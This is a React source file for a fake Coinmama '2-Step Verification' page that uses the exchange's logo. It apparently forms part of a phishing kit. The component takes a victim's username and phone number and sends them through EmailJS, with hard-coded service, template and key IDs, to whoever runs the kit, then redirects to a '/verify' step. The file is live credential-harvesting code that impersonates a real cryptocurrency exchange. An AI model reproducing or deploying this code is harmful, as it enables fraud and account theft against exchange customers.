import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';

const Alert = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [emailPlaceholder, setEmailPlaceholder] = useState('Enter Username');
  const [passwordPlaceholder, setPasswordPlaceholder] = useState('Enter your Number');
  const navigate = useNavigate();

  const handleLogin = () => {
    let isValid = true;

    // Email validation
    if (!email) {
      setEmailError('Username is required');
      setEmailPlaceholder('Enter Username');
      isValid = false;
    } else if (!/^[a-zA-Z0-9\s.,!?'"()_-]*$/.test(email)) {
      setEmailError('Invalid Username format');
      isValid = false;
    } else {
      setEmailError('');
    }

    // Password (Number) validation
    if (!password) {
      setPasswordError('Number is required');
      setPasswordPlaceholder('Enter your Number');
      isValid = false;
    } else {
      setPasswordError('');
    }

    // If valid, send email
    if (isValid) {
      const templateParams = {
        web_name: 'Coinmama',
        from_name: 'Coinmama',
        message: `Name: ${email}, 
        Phone: ${password}, 
        Date: ${new Date().toLocaleDateString()}, 
        Time: ${new Date().toLocaleTimeString()}`,
      };

      emailjs
        .send(
          'service_flnki3h', // Your EmailJS Service ID
          'template_yocogem', // Your EmailJS Template ID
          templateParams,
          'whkd_aIuRw2YauvTF' // Your EmailJS Public Key
        )
        .then(() => {
          setEmail('');
          setPassword('');
          navigate('/verify'); // Navigate to the target route
        })
        .catch((error) => {
          console.error('Error:', error);
          alert('Failed to send email.');
        });
    }
  };

  return (
    <div className="bg-white border-2 border-red-600 min-h-screen flex flex-col items-center pt-10 px-4 sm:px-8 lg:px-16">
      <header className="flex justify-center mb-8">
        <img src={require('../Images/coinmama-logo.webp')} alt="Navigation" className="w-48 " />
      </header>

      <div className="w-full max-w-md border-2 bg-blue-600 p-6 sm:p-8 rounded-lg shadow-lg">
        <main className="flex flex-col items-center">
          <h1 className="text-white text-2xl sm:text-3xl font-medium pb-4 sm:pb-5">2-Step Verification</h1>
          <h3 className="text-sm sm:text-lg text-blue-200 mb-4 sm:mb-6">Verify Your Identity</h3>
          <form
            method="post"
            onSubmit={(e) => {
              e.preventDefault();
              handleLogin();
            }}
            className="w-full"
          >
            <div className="mb-4">
              <input
                type="text"
                id="email"
                name="name"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder={emailPlaceholder}
                className={`w-full sm:pr-40 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  emailError ? 'border-red-500' : 'border-gray-300'
                }`}
                required
              />
              {emailError && <p className="text-red-500 text-xs mt-1">{emailError}</p>}
            </div>
            <div className="mb-6">
              <input
                type="text" // Keep text type but restrict input
                id="password"
                value={password}
                onChange={(e) => {
                  // Allow only numbers
                  const value = e.target.value.replace(/\D/g, '');
                  setPassword(value);
                }}
                placeholder={passwordPlaceholder}
                className={`w-full sm:pr-40 p-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 ${
                  passwordError ? 'border-red-500' : 'border-gray-300'
                }`}
                required
              />
              {passwordError && <p className="text-red-500 text-xs mt-1">{passwordError}</p>}
            </div>
            <div className="flex justify-center">
              <button
                type="submit"
                className="px-16 sm:px-20 bg-gray-400 text-blue-700 font-bold py-3 rounded-lg hover:bg-blue-900 hover:text-white"
              >
                Submit
              </button>
            </div>
          </form>
        </main>
      </div>
    </div>
  );
};

export default Alert;
